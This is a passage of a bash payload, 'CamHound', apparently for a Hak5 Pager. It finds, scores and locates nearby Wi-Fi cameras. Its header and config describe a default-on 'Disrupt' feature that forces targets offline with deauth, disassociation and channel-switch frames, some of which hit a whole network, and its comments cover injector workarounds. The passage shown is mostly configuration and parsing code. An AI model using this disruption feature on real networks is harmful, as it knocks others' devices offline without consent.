#!/bin/bash
# Title: CamHound
# Description: Wi-Fi camera census and response for the Pager. Lists every camera-vendor and
#              camera-capable 802.11 device PineAP Recon can hear, categorises it, grades it on
#              a 0-100 confidence scale, and (on request) locks on one suspect to test whether it
#              is streaming (Watch), whether it reacts to movement (Stimulus test) or where it is
#              (Locate). Identity scan is passive and free; Watch/Locate pause Recon hopping for
#              the duration of the lock. No LAN join. A fourth rung on the device card, Disrupt,
#              reads the target's PMF/beacon-protection posture from its own beacon, then
#              disconnects it with deauth+disassoc, channel-switch announcements, or all three,
#              and judges from Recon whether it actually went quiet. RESPONSE defaults to 1, so
#              Disrupt is present; set it to 0 (Settings -> Response settings) for a recon-only
#              run that transmits nothing. Every transmit sits behind a confirm by default, and
#              only DEAUTH on a client row is targeted -- CSA and BOTH hit the whole BSS.
# Author: tsuinami-1112
# Version: 1.0
# Category: reconnaissance
# Dependencies: _pineap (PineAP engine, Recon running in the GUI), jq (fallback: built-in parser),
#               tcpdump (Watch only; without it Watch is greyed), hexdump or od, awk, iwinfo,
#               timeout, /lib/hak5/oui.txt (fallback /rom/lib/hak5/oui.txt; fallback built-in rows).
# Data file:    cam_signatures.txt next to payload.sh (built-in copy used when missing).
# Loot:         /root/loot/CamHound/{inventory.tsv,events.log,report_<run>.txt,watch_<ts>_<mac>.tsv,responses.tsv}
#
# LED State Descriptions
# SETUP              - loading signatures and preflight
# CYAN SLOW          - scanning (identity cycle every CYCLE_SECS)
# AMBER              - new LIKELY device this cycle (+ one short vibe)
# RED SLOW           - new CONFIRMED device this cycle (+ triple vibe, + ringtone if SOUND=1)
# YELLOW             - new STREAM-lane row (behaviour without identity), or Watch INCONCLUSIVE
# CYAN VERYFAST      - Watch running (Recon hopping paused by the EXAMINE lock)
# R SOLID            - Watch reached STREAM or EVENT (+ one long vibe)
# B/C/Y/R SOLID      - Locate tiers cold/warm/strong/hot (click per sample, vibe at hot)
# MAGENTA            - response transmitting (channel locked for the burst)
# GREEN              - response MOVED: the target stopped transmitting (+ one long vibe)
# YELLOW             - response NO_EFFECT or INCONCLUSIVE
# FAIL               - preflight failure (no _pineap or no vendor table) then exit
# FINISH, then OFF   - clean exit
# States persist until the next cycle restores CYAN SLOW; set_state() never sleeps.
#
# Credits: device_hunter (MONITOR loop), SkimmerScanner (signature file + install-dir probe),
#          SignalFence/live_probe (wlan1mon capture), find_hackers (RECON JSON shape),
#          Tunnel_Rat (EXAMINE lock from a user payload). Design notes in README.md.

PAYLOAD_REL="user/reconnaissance/CamHound"
PAYLOAD_REL_ALT="recon/client/CamHound recon/access_point/CamHound"   # the v1.1 hooks live here
PAYLOAD_NAME="camhound"
VERSION="1.0"

# ----------------------------------------------------------------------------- config block ---
# Starred keys may be overridden without editing: PAYLOAD_SET_CONFIG camhound <KEY> <value>
# All weights and thresholds are lab starting points; see README "Test matrix" (Measured column).
MODE="ROOM"             # ROOM or SITE (menu toggle; changes alerting/proximity/sort, never the list)
CYCLE_SECS=20           # * scan period (floor 5)
COOLDOWN_SECS=600       # * re-alert suppression per MAC
ALERT_DIALOG=1          # * blocking ALERT on NEW CONFIRMED when AUTO_WATCH=0 (0 = off)
AUTO_WATCH=1            # * offer Watch on the top candidate / on NEW CONFIRMED-LIKELY (0 = off)
AUTO_LOCATE=1           # * offer Locate after a STREAM/EVENT Watch (0 = off)
AUTO_WATCH_RSSI=-72     # minimum last RSSI to auto-offer Watch
RSSI_MIN=0              # * optional list gate, dBm, on the best RSSI known for the MAC (0 = off, widest net)
BAND6=0                 # * also scan 6 GHz: writes the device's bands + 6 for this run; put back at exit, by the watchdog if killed, or at the next start (0 = leave as set)
SOUND=0                 # * RINGTONE alert on NEW CONFIRMED (0 = off)
SHOW_MODULES=1          # modules list in the menu
SHOW_OTHER=1            # "Other devices" list: heard, but in neither of the two lists above
MODULE_HINT_RSSI=-55    # client RSSI at or above which a BUSY module gets the "Watch?" hint
BUSY_PPS=10             # counted frames/s floor for BUSY (PineAP packet counter delta)
BUSY_CYCLES=2           # consecutive cycles at or above BUSY_PPS
KIT_MIN_CLIENTS=1       # associated same-label clients for the KIT signal
WIN_SECS=10             # Watch window (floor 5)
LIVE_WINDOWS=6          # Live view windows per Watch (A stops earlier)
WIN_BASE_S=30; WIN_STIM_S=20; WIN_POST_S=20   # stimulus windows
QUIET_SECS=15           # stimulus quiet gate: one capture of this length, repeated up to 4x until uplink is quiet
THR_STREAM_UP=10        # * big uplink frames/s for STREAM
THR_ASYM10=30           # asym (U_bytes/(D_bytes+1)) x10 at or above which a window is up-heavy (3.0)
THR_CV10=6              # coefficient of variation x10 at or below which uplink is steady (0.6)
THR_DELTA10=20          # stimulus delta x10 for EVENT (2.0)
THR_DELTA_WEAK10=15     # stimulus delta x10 for EVENT? (1.5)
THR_STIM_UP=8           # big uplink frames/s floor during stimulus/post for EVENT
THR_DELTA_FLOOR=2       # baseline floor (big fr/s) for the delta ratio
THR_DOWN10=25           # asym x10 at or below which a window is down-heavy (2.5)
BIG_BYTES=1000          # orig_len threshold for a "big" frame
INCONCLUSIVE_FRAMES=20  # display hint on the INCONCLUSIVE screen
WATCH_MIN_RSSI=-72      # below this the Watch header warns that an idle verdict is unreliable
WATCH_OTHERS=1          # third capture "others on this BSS" (Phase 0 item 13c decides CPU)
RELOCK_PER_WINDOW=0     # 1 = re-issue EXAMINE_BSSID before every window (Phase 0 item 8)
MAX_RUNS=3              # stimulus repeats per target per session
LOCATE_SILENT_AP=15; LOCATE_SILENT_CLI=45   # MONITOR file not growing -> "quiet Ns"
MEDIAN_N=5              # Locate median ring
REPORT_EVERY=15         # cycles between report rewrites
GPS=0                   # closest-approach GPS stamping (0 = off)
KEEP_PCAP=0; KEEP_RAW=0 # Watch artefacts copied to loot
DEDUPE_H=0              # * hours: a device already in inventory.tsv within this horizon is not alerted again (0 = off)
INVENTORY_KEEP_DAYS=30  # inventory.tsv rows older than this are pruned at start (0 = never)
ROW_W=22                # list row budget (spike 19; expected 36-40 on the default theme)
RECON_IF="wlan1mon"     # PineAP monitor radio (tri-band)
INJ_SYSFS="/sys/class/ieee80211"   # phy list for the regulatory probe (the laptop harness points this at a fixture)
NET_SYSFS="/sys/class/net"         # netdev tree the probe resolves RECON_IF's phy from (the laptop harness points this at a fixture)
BANDS_PROBE_N=12; BANDS_PROBE_WAIT=0.5   # band write check: samples of the live channel, and the gap between them (~6 s)
# response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
RESPONSE=1              # * master switch for the response rung (0 = recon only, transmits nothing)
SWEEP_TARGETED=1        # * after a BSS-wide deauth, also send ONE TARGETED deauth per recovered member
RECON_FRESH=1           # * start a fresh Recon session at launch, so a run shows what is transmitting NOW
RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
# shellcheck disable=SC2034
SCAN_IF="wlan0"         # reserved: posture cross-check iface, the enabled dummy sta on radio0 (2.4 GHz only)
BCN_CAP_SECS=4          # seconds to wait for a beacon when reading a target's posture
BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one is parsed)
# Client-membership capture, for a BSS-wide response. No shipped firmware carries a client->AP
# association, so the subject set is read off the air instead (RESPONSE.md 13a-i). Deliberately
# NOT starred: the star contract requires a SETTINGS_TABLE row, and that menu is the recon-side
# session's lane -- an unwired star would be a lie (see CLAUDE.md).
CLI_CAP_SECS=4          # listen this long for who is talking to the target BSS
CLI_CAP_COUNT=800       # frame cap for that capture (bounds the parse; the window bounds the dwell)
CLI_CAP_SNAP=128        # MUST clear radiotap it_len + 16 to reach addr2: -s 32 cannot (18+16=34)
# The inverse lookup (assoc_lookup): which BSSID ONE client talks to, read off the air when the
# operator picks Watch or Disrupt on a client the firmware gave no AP for. It parks the radio for
# the listen window, so Recon pauses meanwhile; it reuses CLI_CAP_SNAP and CLI_CAP_COUNT above.
ASSOC_CAP_SECS=6        # * listen this long for one client's own frames when finding its AP (2-30; x3 across the hop)
ASSOC_TTL=300           # * seconds an AP learned off the air is trusted before Watch/Disrupt looks again (0 = look every time)
FIRE_ERR="/tmp/cs_fire_$$.err"   # the attack command's stderr: a refusal must not read as a measurement
# The CSA injector. A CSA from THIS firmware cannot work, for two independent reasons, neither
# reachable by any setting: pineapd hardcodes Channel Switch Count 0 (li s1,0 at 0x4bee6c, which
# ieee80211_mgd_csa_present() discards before the auth/assoc refusal check) AND a New Channel
# Number of 14 (li a3,14 at 0x473634 -- 2484 MHz, Japan-only, 11b-only, absent from the US table).
# Both are literals with a single call site. dev/injector/pagerinj builds the element properly, so
# pointing CSA_INJECTOR at it routes the CSA leg there instead of at the firmware command.
# DEFAULT OFF, and read dev/injector/README.md before turning it on. pagerinj's own docs say to
# STOP PINEAPD first, because it hops the interface and its CSA flood is itself a CSA-bearing clone
# source. CamHound cannot stop pineapd -- Recon, the EXAMINE lock and every deauth command ARE
# pineapd -- so the in-payload path is betting that the EXAMINE lock holds the channel well enough,
# and that bet is UNMEASURED. The validated way to run pagerinj is standalone, with pineapd stopped;
# dev/injector/run_17a.sh does that. Turn this on only once the bench says the two can coexist.
# Not starred: cfg() accepts integers only, so a path cannot arrive via PAYLOAD_SET_CONFIG, and a
# star with no SETTINGS_TABLE row is a lie (CLAUDE.md). Edit these here.
CSA_INJECTOR=""         # absolute path to pagerinj; empty = use the firmware command
CSA_COUNT=3             # Channel Switch Count to announce. pineapd sends 0; day-one 17a is 0 vs 3
CSA_CHAN=0              # New Channel Number to announce; 0 = auto, a legal channel in the same band
CSA_INJ_SECS=3          # seconds pagerinj transmits (its own --secs)
CSA_INJ_WAIT=5          # seconds pagerinj waits for a clean beacon to clone (its own --wait)
POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
LOOT_DIR="/root/loot/CamHound"
OUI_KEYS="/tmp/cs_oui_keys.$$"          # vendor_prefetch's key list, removed as soon as awk has read it
BANDS_STATE="$LOOT_DIR/.bands_orig"      # the bands a run changed, on disk (survives a reboot) so a killed run is undone by the watchdog or the next start
OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
# identity weights (constants, not table columns)
W_OUI=45; W_WEAK=20; W_MODULE=0; W_ENDPOINT=-25; W_SSID=45; W_SSID_WEAK=15
W_HIDDEN=10; W_KIT=35; W_KIT_WEAK=10; W_PROBE=5; W_RAND=-40
# behaviour weights
W_STREAM_RATE=30; W_STREAM_FAST=35; W_SUSTAIN=10; W_ASYM=15; W_EVENT=60; W_EVENT_WEAK=40; W_BUSY=10; W_DOWN=-20
# ------------------------------------------------------------------------- end config block ---

# --- camhound lib begin ---
shopt -s extglob nocasematch 2>/dev/null; shopt -u nocasematch
declare -A SIG_VENDOR_PAT SIG_VENDOR_CAT SIG_VENDOR_TYPE   # keyed by label
declare -A SIG_OUI_LABEL SIG_OUI_CAT                                        # keyed by hex prefix
declare -A SIG_SSID_PAT SIG_SSID_CAT SIG_SSID_TYPE          # keyed by label
declare -A SIG_LABEL_SEEN TAG_MEANING
declare -a VENDOR_ORDER SSID_ORDER
SIG_COUNT=0; SIG_SOURCE="built-in"; SIG_BAD=0
RUN_ID=""; RUN_T0=0; CYCLE=0; PAUSED_SECS=0; STATE=""; WATCH_LOCKED=0; OWN_MACS=" "
MAIN_PID=$$; CHILD_FILE="/tmp/cs_children"; LOCK_FILE="/tmp/cs_run.pid"
HAVE_JQ=0; HAVE_TCPDUMP=0
TAG_MEANING=([HIDDEN]="hidden SSID + camera-vendor OUI" [RAND]="randomised client MAC: vendor unknown"
  [KIT-AP]="AP + clients share one camera brand (kit/NVR)" [KIT-CL]="camera of a detected kit"
  [KIT?]="module clients cluster on an odd AP" [MODULE]="IoT radio module: brand unknown"
  [PROBE]="probes for a camera SSID" [BUSY]="high packet rate this cycle"
  [STREAM]="steady big uplink: streaming-consistent" [EVENT]="uplink jumped when you moved"
  [EVENT?]="uplink rose when you moved (weak)" [DOWN]="download-heavy: call/update, not camera-like"
  [IDLE]="asleep, disarmed or local-record" [NONE]="traffic seen, no camera pattern" [SEEN]="known from an earlier run")

# log LEVEL msg...  -> events.log (debug mirror); never prints to the screen
log() { local lvl="$1"; shift; printf '%s %s %s\n' "$EPOCHSECONDS" "$lvl" "$*" >>"$LOOT_DIR/events.log" 2>/dev/null; }

# ui_ok: DuckyScript commands present? (selftest/replay on a laptop run without them)
ui_ok() { command -v LOG >/dev/null 2>&1; }

# set_state NAME -> the only caller of LED / VIBRATE / RINGTONE
set_state() {
  # shellcheck disable=SC2034
  STATE="$1"   # last state name, for events.log
  case "$1" in
    SETUP)        LED SETUP ;;
    SCAN)         LED CYAN SLOW ;;
    LIKELY)       LED AMBER; VIBRATE 100 ;;
    LIKELY_QUIET) LED AMBER ;;
    CONFIRMED)    LED RED SLOW; VIBRATE 200 100 200; [ "$SOUND" = 1 ] && RINGTONE alert >/dev/null 2>&1 & ;;
    LANE)         LED YELLOW ;;
    WATCH)        LED CYAN VERYFAST ;;
    WATCH_HIT)    LED R SOLID; VIBRATE 300 100 300 ;;
    INCONCLUSIVE) LED YELLOW; VIBRATE 100 ;;
    LOC1)         LED B SOLID ;;
    LOC2)         LED C SOLID ;;
    LOC3)         LED Y SOLID ;;
    LOC4)         LED R SOLID; VIBRATE 50 ;;
    RESPOND)      LED MAGENTA ;;
    RESPOND_HIT)  LED GREEN; VIBRATE 300 ;;
    RESPOND_NIL)  LED YELLOW; VIBRATE 100 ;;
    FAIL)         LED FAIL; VIBRATE 500 ;;
    FINISH)       LED FINISH; LED OFF ;;
    OFF)          LED OFF ;;
  esac
} 2>/dev/null

# resp_clamp_lock: the EXAMINE lock must outlast lock_target's read-back (~2.5 s) + the fire + RESP_SETTLE_SECS,
# or the post-fire Recon read happens after hopping resumed and a stalled counter reads as MOVED.
# The +5 budgets the read-back and the fire only. When the pick is not in the bss sweep (real firmware,
# where ap_mac is '-'), the post-fire resp_snapshot also runs recon_stat: up to two more _pineap RECON
# reads, each under a 15 s timeout, before unlock_target. How long those take on the device decides
# whether 5 is enough; a bench run with 'resp' lines timestamped in events.log settles it (day-one 8b).
resp_clamp_lock() {
  local min=$(( RESP_SETTLE_SECS + 5 ))
  if (( RESP_LOCK_SECS < min )); then
    RESP_LOCK_SECS=$min; log warn "RESP_LOCK_SECS raised to $min: must exceed fire + settle"; ui_ok && LOG yellow "RESP_LOCK_SECS raised to $min"
  fi
  return 0
}
# rssi_min_clamp: RSSI_MIN is a dBm threshold (negative) or 0 for off; a positive value would hide every device that has a reading
rssi_min_clamp() {
  if (( RSSI_MIN > 0 )); then
    log warn "RSSI_MIN $RSSI_MIN is not a dBm value: gate off"; ui_ok && LOG yellow "RSSI_MIN $RSSI_MIN ignored: use 0 (off) or a negative dBm"; RSSI_MIN=0
  fi
  return 0
}
# assoc_clamp: the find-AP lookup parks the radio and holds the screen for ASSOC_CAP_SECS -- three times
# that when the park is refused and it listens across the hop -- with no button check while it listens.
# cfg() and the Settings menu enforce a floor and nothing above it, so a mistyped or hand-edited value
# would turn one pick into minutes of a blind Recon. 30 s parked, 90 s across the hop, is the ceiling.
assoc_clamp() {
  if (( ASSOC_CAP_SECS > 30 )); then
    log warn "ASSOC_CAP_SECS $ASSOC_CAP_SECS capped at 30"; ui_ok && LOG yellow "ASSOC_CAP_SECS capped at 30"; ASSOC_CAP_SECS=30
  elif (( ASSOC_CAP_SECS < 2 )); then
    log warn "ASSOC_CAP_SECS $ASSOC_CAP_SECS raised to 2"; ASSOC_CAP_SECS=2
  fi
  return 0
}
# cfg KEY DEFAULT [FLOOR] -> persisted integer override or the default
cfg() {
  local v
  v=$(PAYLOAD_GET_CONFIG "$PAYLOAD_NAME" "$1" 2>/dev/null)
  if [[ $v =~ ^-?[0-9]+$ ]] && (( v >= ${3:--999999} )); then
    CFG_OVERRIDES=$((CFG_OVERRIDES + 1)); CFG_NOTE+=" $1=$v"; printf '%s' "$v"
  else
    printf '%s' "$2"
  fi
}
CFG_OVERRIDES=0; CFG_NOTE=""
load_overrides() {
  if command -v PAYLOAD_GET_CONFIG >/dev/null 2>&1; then
    CYCLE_SECS=$(cfg CYCLE_SECS "$CYCLE_SECS" 5)
    COOLDOWN_SECS=$(cfg COOLDOWN_SECS "$COOLDOWN_SECS" 0)
    ALERT_DIALOG=$(cfg ALERT_DIALOG "$ALERT_DIALOG" 0)
    AUTO_WATCH=$(cfg AUTO_WATCH "$AUTO_WATCH" 0)
    AUTO_LOCATE=$(cfg AUTO_LOCATE "$AUTO_LOCATE" 0)
    RSSI_MIN=$(cfg RSSI_MIN "$RSSI_MIN" -100)
    SOUND=$(cfg SOUND "$SOUND" 0)
    BAND6=$(cfg BAND6 "$BAND6" 0)
    ASSOC_CAP_SECS=$(cfg ASSOC_CAP_SECS "$ASSOC_CAP_SECS" 2)
    ASSOC_TTL=$(cfg ASSOC_TTL "$ASSOC_TTL" 0)
    THR_STREAM_UP=$(cfg THR_STREAM_UP "$THR_STREAM_UP" 1)
    RESPONSE=$(cfg RESPONSE "$RESPONSE" 0)
    RESPONSE_CONFIRM=$(cfg RESPONSE_CONFIRM "$RESPONSE_CONFIRM" 0)
    RESP_LOCK_SECS=$(cfg RESP_LOCK_SECS "$RESP_LOCK_SECS" 5)
    RESP_SETTLE_SECS=$(cfg RESP_SETTLE_SECS "$RESP_SETTLE_SECS" 1)
    AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
    SWEEP_TARGETED=$(cfg SWEEP_TARGETED "$SWEEP_TARGETED" 0)
    RECON_FRESH=$(cfg RECON_FRESH "$RECON_FRESH" 0)
    POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
    DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
  fi
  # the clamps also cover a config-block edit, so they run whether or not the device offers persistence
  resp_clamp_lock; rssi_min_clamp; assoc_clamp
}

# install dir: the UI runs a copy from /tmp, so look for the data file where it can live
find_install_dir() {
  local d r rel
  for d in "${_PAYLOAD_HOME:-${PAYLOAD_HOME:-}}" "$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"; do
    [ -n "$d" ] && [ -f "$d/cam_signatures.txt" ] && { printf '%s' "$d"; return 0; }
  done
  for r in /root/payloads /sd/payloads /mmc/root/payloads; do
    for rel in $PAYLOAD_REL $PAYLOAD_REL_ALT; do
      [ -f "$r/$rel/cam_signatures.txt" ] && { printf '%s' "$r/$rel"; return 0; }
    done
  done
  return 1
}

# sanitise: printable only, no | or ; , bounded length. Bash expansion only (zero fork).
clean_text() { local s="$1"; s=${s//[![:print:]]/}; s=${s//[|;]/_}; printf '%s' "${s:0:${2:-32}}"; }

# add_sig TYPE CAT LABEL PATTERN LINENO -> 0 ok, 1 rejected (loud)
add_sig() {
  local type="$1" cat="$2" label="$3" pat="$4" ln="$5" hex
  case "$type" in OUI|VENDOR|VENDOR_WEAK|VENDOR_MODULE|VENDOR_ENDPOINT|SSID|SSID_WEAK) ;; *) sig_reject "$ln" "bad TYPE $type"; return 1 ;; esac
  case "$cat" in SECURITY|DOORBELL|BABY|ACTION|DASH|DRONE|BODYCAM|ALPR|NVRKIT|MIXED|IOTMOD|ENDPOINT) ;; *) sig_reject "$ln" "bad CAT $cat"; return 1 ;; esac
  [[ $label =~ ^[A-Z0-9][A-Z0-9?-]{1,9}$ ]] || { sig_reject "$ln" "bad label $label"; return 1; }
  [ -z "$pat" ] && { sig_reject "$ln" "empty pattern"; return 1; }
  if [ -n "${SIG_LABEL_SEEN[$label]}" ] && [ "${SIG_LABEL_SEEN[$label]}" != "$type" ]; then sig_reject "$ln" "label $label reused across TYPEs"; return 1; fi
  SIG_LABEL_SEEN[$label]="$type"
  case "$type" in
    OUI)
      hex=${pat^^}; hex=${hex//:/}
      [[ $hex =~ ^[0-9A-F]{6}$|^[0-9A-F]{7}$|^[0-9A-F]{9}$ ]] || { sig_reject "$ln" "bad OUI $pat"; return 1; }
      SIG_OUI_LABEL[$hex]="$label"; SIG_OUI_CAT[$hex]="$cat" ;;
    VENDOR|VENDOR_WEAK|VENDOR_MODULE|VENDOR_ENDPOINT)
      [ -z "${SIG_VENDOR_PAT[$label]}" ] && VENDOR_ORDER+=("$label")
      SIG_VENDOR_PAT[$label]="$pat"; SIG_VENDOR_CAT[$label]="$cat"; SIG_VENDOR_TYPE[$label]="$type" ;;
    SSID|SSID_WEAK)
      [ -z "${SIG_SSID_PAT[$label]}" ] && SSID_ORDER+=("$label")
      SIG_SSID_PAT[$label]="$pat"; SIG_SSID_CAT[$label]="$cat"; SIG_SSID_TYPE[$label]="$type" ;;
  esac
  SIG_COUNT=$((SIG_COUNT + 1)); return 0
}
sig_reject() { SIG_BAD=$((SIG_BAD + 1)); ui_ok && LOG yellow "sig line $1 skipped: $2"; log warn "sig line $1 skipped: $2"; }

# load_signatures [file] -> parses TYPE|CAT|LABEL|PATTERN  # note ; PATTERN is last so | is safe
load_signatures() {
  local src="$1" line type cat label pat n=0
  while IFS= read -r line || [ -n "$line" ]; do
    n=$((n + 1)); line=${line%$'\r'}
    [[ $line =~ ^[[:space:]]*(#|$) ]] && continue
    line=${line%%+([[:space:]])#*}          # strip trailing "  # note"
    IFS='|' read -r type cat label pat <<<"$line"
    [ -z "$pat" ] && { sig_reject "$n" "needs 4 fields"; continue; }
    pat=${pat%%+([[:space:]])}; type=${type%%+([[:space:]])}
    add_sig "$type" "$cat" "$label" "$pat" "$n"
  done <"$src"
}
builtin_signatures() {
  cat <<'EOF'
OUI|SECURITY|REO-OUI|EC:71:DB
OUI|SECURITY|WYZE-OUI|A4:DA:22:2
VENDOR|SECURITY|HIK-OUI|hikvision|hangzhou ezviz
VENDOR|SECURITY|DAHUA-OUI|zhejiang dahua
VENDOR|SECURITY|ARLO-OUI|arlo technolog
VENDOR|SECURITY|AXIS-OUI|axis communications ab
VENDOR|SECURITY|HANW-OUI|hanwha (techwin|vision)
VENDOR|SECURITY|WYZE-V|wyze labs
VENDOR|SECURITY|REO-V|reolink
VENDOR|DOORBELL|RING-OUI|^ring llc
VENDOR|SECURITY|BLINK-OUI|blink by amazon|immedia
VENDOR|SECURITY|NEST-OUI|nest labs|dropcam
VENDOR|SECURITY|CCTV-OUI|vivotek|verkada|avigilon|mobotix|arecont|amcrest|swann communications|lorex technology|uniview|zhejiang uniview
VENDOR|DASH|DASH-OUI|pittasoft|thinkware
VENDOR|BODYCAM|AXON-OUI|taser international|axon enterprise
VENDOR|ACTION|GOPRO-OUI|gopro|arashi vision
VENDOR_WEAK|MIXED|AMZN-MIX|amazon technologies
VENDOR_WEAK|MIXED|GOOG-MIX|^google
VENDOR_WEAK|MIXED|TPL-MIX|tp-link
VENDOR_WEAK|MIXED|TUYA-MIX|tuya smart
VENDOR_WEAK|MIXED|XIAOMI-MIX|xiaomi
VENDOR_WEAK|MIXED|ANKER-MIX|fantasia trading|smart innovation llc
VENDOR_WEAK|MIXED|NET-MIX|netgear|ubiquiti|logitech
VENDOR_WEAK|DRONE|DJI-MIX|sz dji
VENDOR_MODULE|IOTMOD|ESP-MOD|espressif
VENDOR_MODULE|IOTMOD|RTK-MOD|realtek
VENDOR_MODULE|IOTMOD|AZW-MOD|azurewave|murata|ampak|fn-link|bilian|ai-thinker|hi-?link|ai-link|mediatek|texas instruments|ingenic|quectel
VENDOR_MODULE|IOTMOD|USI-MOD|lite-?on|universal scientific
VENDOR_MODULE|IOTMOD|OEM-MOD|sercomm|wistron neweb
VENDOR_ENDPOINT|ENDPOINT|INTEL-END|intel corporate
VENDOR_ENDPOINT|ENDPOINT|OEM-END|apple, inc|samsung electronics|microsoft|dell inc|hewlett packard|^hp inc|lenovo|qualcomm
SSID|SECURITY|EZVIZ-AP|^EZVIZ_[0-9A-Z]{9}$
SSID|SECURITY|HAP-AP|^HAP_
SSID|SECURITY|TAPO-AP|^Tapo_Cam_
SSID|SECURITY|BLINK-AP|^BLINK-[0-9A-Za-z]{4}$
SSID|DOORBELL|RING-AP|^Ring-[0-9A-Fa-f]{6}$|^Ring Setup [0-9A-Fa-f]{2}$
SSID|SECURITY|IPC-AP|^IPC_AP_|^GW_AP_|^HICAM_|^CAM_[0-9A-F]{6}$|^MCCamera|^MV[0-9]{8}$|^Swann-SWIFI-|^DAP-AMC
SSID|ACTION|GOPRO-AP|^GP[0-9]{8}$|\.OSC$
SSID_WEAK|SECURITY|CAMWORD|(^|[^[:alnum:]])(cam|camera|ipc|nvr|dvr|doorbell)([^[:alnum:]]|$)
EOF
}

# vendor lookup: one grep per NEW MAC, cached; both oui.txt key spellings and column layouts
declare -A VENDOR VLOW
# OUI_AWK: resolve many OUI keys in ONE pass over the table, instead of one grep per MAC.
# Measured on the Pager 2026-11-05: a single failed `grep -i -m1` over /lib/hak5/oui.txt
# (1,258,802 B, 38,959 lines) costs 5.05 s wall / 2.08 s CPU, and a cold cycle resolved 960 MACs.
# Semantics are matched to the grep it replaces, which is prefix- and case-insensitive:
#   * the line's own key is derived by stripping : and - and upper-casing the first six characters,
#     so EC71DB, EC:71:DB, EC-71-DB and a longer first field such as EC71DB0 all reduce to EC71DB.
#     The long-prefix case is not hypothetical - this payload ships a 7-nibble OUI row (A4:DA:22:2).
#   * first match wins, mirroring grep -m1, so a duplicated OUI keeps the FIRST vendor, not the last.
#   * FS is \t+ because bash's `IFS=$'\t' read` collapses tab runs and awk -F'\t' does not; the
#     canonical IEEE 3-column layout has a double tab and would otherwise yield an empty vendor.
#   * ishexish() replaces the /^[0-9A-Fa-f:-]{6,17}$/ interval, because mawk (what the dev host runs)
#     and BusyBox awk (what the Pager runs) do not agree on interval regexes.
OUI_AWK='
function ishexish(x) { return (length(x) >= 6 && length(x) <= 17 && x ~ /^[0-9A-Fa-f:-]+$/) }
BEGIN { FS = "\t+" }
NR == FNR { want[$0] = 1; next }
{ k = $1; gsub(/[:-]/, "", k); k = toupper(substr(k, 1, 6))
  if ((k in want) && !(k in got)) {
    if (NF < 2) { v = $0 }
    else { v = $2; if (v == "(hex)" || ishexish(v)) v = (NF >= 3 ? $3 : ""); if (v == "") v = $2 }
    got[k] = 1; print k "\t" v } }'

# vendor_prefetch mac... -> resolve every not-yet-cached, non-randomised MAC in one table pass.
# Misses are cached too (VLOW set to empty): the 5.05 s datum IS the miss, so caching only the hits
# would optimise the cheap half and leave the expensive half falling through to vendor_of's grep.
vendor_prefetch() {
  local m hex v cv; local -A vp_want=() vp_found=()   # vp_ prefix: `want` and `found` are string locals
                                                     # elsewhere, and bash locals are dynamically scoped
  [ -r "$OUI_FILE" ] && (( $# > 0 )) || return 0
  for m in "$@"; do
    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
    is_rand "$m" && continue
    hex=${m^^}; hex=${hex//:/}; vp_want[${hex:0:6}]=1
  done
  (( ${#vp_want[@]} )) || return 0
  printf '%s\n' "${!vp_want[@]}" >"$OUI_KEYS" 2>/dev/null || return 0
  while IFS=$'\t' read -r hex v; do vp_found[$hex]="$v"; done < <(awk "$OUI_AWK" "$OUI_KEYS" "$OUI_FILE" 2>/dev/null)
  rm -f "$OUI_KEYS"
  for m in "$@"; do
    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
    is_rand "$m" && continue
    hex=${m^^}; hex=${hex//:/}; v="${vp_found[${hex:0:6}]}"
    VLOW[$m]="${v,,}"
    cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$m]="${cv:0:14}"
  done
}

vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] (lowercase full)
  local mac="$1" hex key line v="" cv
  [ -n "${VLOW[$mac]+x}" ] && return 0
  # A locally administered MAC is a guaranteed full-file miss, which is the 5.05 s worst case rather
  # than the average, so skip the table for it. This MUST sit after the cache guard above: before it,
  # st_device's injected VLOW is overwritten and four scoring checks fail (tested).
  # The tempting premise "locally administered implies absent from the registry" is FALSE - the live
  # MA-L registry carries 18 such assignments (AA0000-AA0004 DEC, 02608C/02C08C 3Com, 020701/027001
  # Racal-Datacom) - but all 18 are 1980s vendors no modern device presents, and upsert_rows already
  # refuses to persist a randomised client row at all, so the lookup buys nothing either way.
  if is_rand "$mac"; then VLOW[$mac]=""; VENDOR[$mac]="-"; return 0; fi
  hex=${mac^^}; hex=${hex//:/}; key="${hex:0:6}"
  if [ -r "$OUI_FILE" ]; then
    line=$(grep -i -m1 -e "^${key}" -e "^${key:0:2}:${key:2:2}:${key:4:2}" -e "^${key:0:2}-${key:2:2}-${key:4:2}" "$OUI_FILE" 2>/dev/null)
    if [ -n "$line" ]; then
      IFS=$'\t' read -r _ v _ <<<"$line"
      [[ $v =~ ^\(hex\)$|^[0-9A-Fa-f:-]{6,17}$ ]] && { IFS=$'\t' read -r _ _ v _ <<<"$line"; }
      [ -z "$v" ] && v=${line#*$'\t'}
      v=${v%%$'\t'*}
    fi
  fi
  # clean_text inlined: $( ) forked once per new MAC, measured at 1.15 ms a time in the cold cycle.
  VLOW[$mac]="${v,,}"; cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$mac]="${cv:0:14}"
}

# is_rand mac -> locally administered bit set
is_rand() { [[ ${1:1:1} =~ [26aeAE] ]]; }

# band_of freq -> sets BAND_V to 2 | 5 | 6 | ?
# Sets a global rather than printing: its one caller is in the per-device path, where $( ) forked
# once per device per cycle. Measured in container against a 960-device fixture, inlining this and
